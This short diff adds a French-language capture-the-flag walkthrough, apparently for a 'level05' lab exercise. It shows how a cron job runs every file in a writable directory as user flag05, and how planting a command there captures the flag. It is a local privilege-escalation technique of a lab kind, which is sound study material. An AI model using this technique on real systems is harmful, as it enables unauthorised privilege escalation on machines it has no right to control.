@@ -1,0 +1,16 @@
+cat /var/mail/level05
+> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+= exécuter /usr/sbin/openarenaserver la commande en tant que flag05
+
+cat /usr/sbin/openarenaserver
+> #!/bin/sh
+> 
+> for i in /opt/openarenaserver/* ; do
+> 	(ulimit -t 5; bash -x "$i")
+> 	rm -f "$i"
+> done
+
+= exécute tous les fichiers présent dans le dossier /opt/openarenaserver/ et les supprime
+/opt/openarenaserver writable
+Donc on peut créer un fichier qui exécute la commande getflag et la rediriger dans un fichier :
+getflag > /opt/openarenaserver/fichierquicontienleflag
